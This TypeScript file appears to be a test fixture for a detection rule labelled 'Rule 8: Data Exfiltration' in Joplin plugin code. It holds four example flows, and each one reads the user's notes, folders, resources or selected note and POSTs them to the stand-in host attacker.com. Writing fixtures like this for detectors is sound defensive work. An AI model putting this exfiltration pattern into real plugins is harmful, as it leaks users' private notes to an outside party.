// Mock dependencies to avoid TS errors
import * as joplin from 'api';
import fetch from 'node-fetch';

async function triggerRule() {
    // Rule 8 : Data Exfiltration
    // Flow 1: joplin.data.get(['notes']) -> network sink
    const r8f1 = await joplin.data.get(['notes']);
    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(r8f1) });

    // Flow 2: joplin.data.get(['folders']) -> network sink
    const r8f2 = await joplin.data.get(['folders']);
    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(r8f2) });

    // Flow 3: joplin.data.get(['resources']) -> network sink
    const r8f3 = await joplin.data.get(['resources']);
    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(r8f3) });

    // Flow 4: joplin.workspace.selectedNote() -> network sink
    const r8f4 = await joplin.workspace.selectedNote();
    fetch('http://attacker.com', { method: 'POST', body: JSON.stringify(r8f4) });
}

export {};
